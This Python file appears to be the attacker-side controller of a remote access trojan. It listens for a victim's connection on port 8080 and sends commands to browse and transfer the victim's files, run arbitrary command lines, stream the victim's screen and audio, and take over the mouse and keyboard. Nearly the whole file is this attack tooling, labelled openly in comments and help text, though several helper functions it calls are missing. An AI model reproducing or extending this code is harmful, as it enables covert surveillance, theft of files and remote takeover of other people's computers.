from time import sleep
from shlex import split as shlexSplit
import socket
import threading

SERVER_PORT = 8080

# change directory and list directory contents
CHANGE_DIR = 1
LIST_DIR = 2
# upload and download files from/to attacker
UPLOAD = 3
DOWNLOAD = 4
# run an arbitrary comamnd
RUN_CMD = 5
# start and end video, mouse, and audio streams
START_VIDEO = 6
END_VIDEO = 7
START_MOUSE = 8
END_MOUSE = 9
START_AUDIO = 10
END_AUDIO = 11
START_KEYS = 13
END_KEYS = 14
# end the process (on the victim's computer)
KILL_PROC = 12
# print the rest of the message to provide useful info
PRINT_INFO = 15
# inform the attacker what the current directory is
NEW_CURR_DIR = 16

# the current directory - printed to console when expecting user input
currDir = ""

"""
	Create a class to handle information received on the main socket
	This class will run as a separate thread
"""
class mainSockThread (threading.Thread):
	def __init__(self, mainSock):
		threading.Thread.__init__(self, daemon=True)
		self.mainSock = mainSock

	def run(self):
		global currDir

		while True:
			data = ''
			try:
				data = self.mainSock.recv(4096)
			except Exception as inst:
				print(type(inst))
				print(inst.args)
				print(inst)
				sleep(10)
			if not data:
				# TODO - connection closed
				print("Connection closed! TODO - Exit program...")
				sleep(1)
				continue
			if data[0] == PRINT_INFO:
				print(str(data[1:], 'UTF-8'))
			elif data[0] == NEW_CURR_DIR:
				currDir = str(data[1:], 'UTF-8')

"""
	Create a server socket and listen for an incoming connection
	Returns the socket associated with the connection
"""
def openConnection(portNum):
	print(f"Listening for connection on port {portNum} ...")

	# create an IPv4 TCP server socket and set it up to listen
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serversocket.bind(('', portNum))
	serversocket.listen()

	# listen for incoming connections and accept them
	(clientsocket, address) = serversocket.accept()
	print("Connection established")

	# close the server socket and return the socket associated with the connection
	serversocket.close()
	return clientsocket

"""
	 echo messages back to the sender
	while True:
		data = clientsocket.recv(4096)
		if not data:
			break
		print(data)
		data_s = b'ECHO: ' + data + b'\0'
		print(data_s)
		clientsocket.sendall(data_s)
"""

def handleCommand(cmd, mainSock):
	if cmd.startswith("help"):
		print("cd [directory] - change current directory")
		print("ls/dir - list directory contents")
		print("upload [local file] [remote file] - upload file to victim computer")
		print("download [remote file] [local file] - download file from victim computer")
		print("exec [command line] - run command from command promp on victim computer")
		print("video [start/stop] - start or stop streaming victim's screen")
		print("audio [start/stop] - start or stop streaming victim's audio")
		print("mouse [start/stop] - start or stop controlling victim's mouse")
		print("keys [start/stop] - start or stop controlling victim's keyboard")
		print("terminate - end the listening process on the victim's computer")
		print("exit/stop/quit - end this process")
	elif cmd.startswith("cd"):
		if len(cmd) <= 3:
			print("Please provide a directory to change to")
			return
		mainSock.sendall(bytes([CHANGE_DIR]) + cmd[3:].encode('UTF-8') + b'\0')
		sleep(0.2)
	elif cmd in ["ls", "dir"]:
		mainSock.sendall(bytes([LIST_DIR]) + b'\0')
		# TODO - option to list contents from arbitrary directory?
	elif cmd.startswith("upload"):
		args = shlexSplit(cmd)
		if len(args) == 3:
			uploadFile(args[1], args[2])
		elif len(args) == 2:
			uploadFile(args[1], args[1])
		else:
			print("Incorrect command usage! Use \"help\" to see commands")
	elif cmd.startswith("download"):
		args = shlexSplit(cmd)
		if len(args) == 3:
			downloadFile(args[1], args[2])
		elif len(args) == 2:
			downloadFile(args[1], args[1])
		else:
			print("Incorrect command usage! Use \"help\" to see commands")
	elif cmd.startswith("exec"):
		if len(cmd) <= 5:
			print("Please provide a command line to execute")
			return
		mainSock.sendall(bytes([RUN_CMD]) + cmd[5:].encode('UTF-8') + b'\0')
		# TODO - possible handling of error/return codes?
	elif cmd.split(" ")[0] in ["video", "audio", "mouse", "keys"]:
		args = cmd.split(" ")
		if len(args) != 2:
			print("Incorrect command usage! Use \"help\" to see commands")
			return
		if args[1] == "start":
			if args[0] == "video":
				startVideoStream(mainSock) # this function will send the listening port number
			elif args[0] == "audio":
				startAudioStream(mainSock) # this function will send the listening port number
			elif args[0] == "mouse":
				startMouseControl(mainSock) # this function will send the listening port number
			elif args[0] == "keys":
				startKeysControl(mainSock) # this function will send the listening port number
		elif args[1] == "stop":
			if args[0] == "video":
				mainSock.sendall(bytes([END_VIDEO, 0]))
				# TODO - kill local thread for receiving video stream
			elif args[0] == "audio":
				mainSock.sendall(bytes([END_AUDIO, 0]))
				# TODO - kill local thread for receiving video stream
			elif args[0] == "mouse":
				mainSock.sendall(bytes([END_MOUSE, 0]))
				# TODO - kill local thread for receiving video stream
			elif args[0] == "keys":
				mainSock.sendall(bytes([END_KEYS, 0]))
				# TODO - kill local thread for receiving video stream
		else:
			print("Incorrect command usage! Use \"help\" to see commands")
	elif cmd == "terminate":
		mainSock.sendall(bytes([KILL_PROC, 0]))
	elif cmd != '':
		print("Unknown command received! Use \"help\" to list available commands")

"""
	Run the main loop for getting user input and 
"""
def main():
	global currDir

	# establish a connection for sending commands
	mainSock = openConnection(SERVER_PORT)

	# start a separate thread to listen for info received on the main socket
	mainListenThread = mainSockThread(mainSock)
	mainListenThread.start()

	# main command loop
	cmd = input(f"{currDir}>")
	while cmd not in ["exit", "stop", "quit"]:
		handleCommand(cmd, mainSock)
		cmd = input(f"{currDir}>")

	# close the main command socket
	mainSock.close()

if __name__ == "__main__":
	main()